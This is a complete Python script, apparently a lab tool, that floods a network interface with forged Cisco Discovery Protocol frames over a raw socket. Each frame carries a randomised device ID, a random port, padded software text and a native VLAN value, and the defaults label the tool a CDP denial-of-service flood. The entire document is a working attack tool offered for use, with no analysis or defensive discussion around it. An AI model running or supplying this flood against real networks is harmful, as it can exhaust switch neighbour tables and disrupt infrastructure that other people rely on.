#!/usr/bin/env python3
import argparse
import os
import random
import signal
import socket
import struct
import sys
import time

running = True

def stop(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, stop)

def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff

def tlv(t, value):
    return struct.pack("!HH", t, len(value) + 4) + value

def get_mac(iface):
    path = f"/sys/class/net/{iface}/address"
    if not os.path.exists(path):
        print(f"No existe la interfaz {iface}")
        sys.exit(1)
    mac = open(path).read().strip()
    return bytes(int(x, 16) for x in mac.split(":"))

def build_cdp(ttl, prefix, seq, extra):
    device_id = f"{prefix}-{seq}-{random.randint(100000, 999999)}".encode()
    port_id = f"GigabitEthernet{random.randint(0, 9)}/{random.randint(0, 48)}".encode()
    capabilities = struct.pack("!I", 0x00000008)
    software = ("Cisco IOS Software, CDP Lab Flood " + ("X" * extra)).encode()
    platform = b"cisco IOSvL2-LAB"
    native_vlan = struct.pack("!H", 58)

    body = b""
    body += tlv(0x0001, device_id)
    body += tlv(0x0003, port_id)
    body += tlv(0x0004, capabilities)
    body += tlv(0x0005, software)
    body += tlv(0x0006, platform)
    body += tlv(0x000a, native_vlan)

    header = struct.pack("!BBH", 2, ttl, 0)
    packet = header + body
    csum = checksum(packet)
    return struct.pack("!BBH", 2, ttl, csum) + body

def build_frame(src_mac, args, seq):
    dst_mac = bytes.fromhex("01000ccccccc")
    llc_snap = b"\xaa\xaa\x03\x00\x00\x0c\x20\x00"
    cdp = build_cdp(args.ttl, args.prefix, seq, args.extra)
    payload = llc_snap + cdp
    length = struct.pack("!H", len(payload))
    return dst_mac + src_mac + length + payload

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("--pps", type=int, default=25)
    parser.add_argument("--count", type=int, default=0)
    parser.add_argument("--ttl", type=int, default=180)
    parser.add_argument("--prefix", default="CDP-DOS-LAB")
    parser.add_argument("--extra", type=int, default=200)
    args = parser.parse_args()

    if args.pps < 1 or args.pps > 200:
        print("Usa un valor entre 1 y 200 para --pps")
        sys.exit(1)

    try:
        src_mac = get_mac(args.iface)
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((args.iface, 0))
    except PermissionError:
        print("Ejecuta el script con sudo")
        sys.exit(1)

    interval = 1 / args.pps
    sent = 0
    next_status = time.time() + 1

    print(f"Enviando CDP por {args.iface} a {args.pps} paquetes por segundo")
    print("Presiona Ctrl+C para detener")

    while running and (args.count == 0 or sent < args.count):
        frame = build_frame(src_mac, args, sent)
        sock.send(frame)
        sent += 1

        now = time.time()
        if now >= next_status:
            print(f"Paquetes CDP enviados: {sent}")
            next_status = now + 1

        time.sleep(interval)

    print(f"Finalizado. Total enviado: {sent}")

if __name__ == "__main__":
    main()
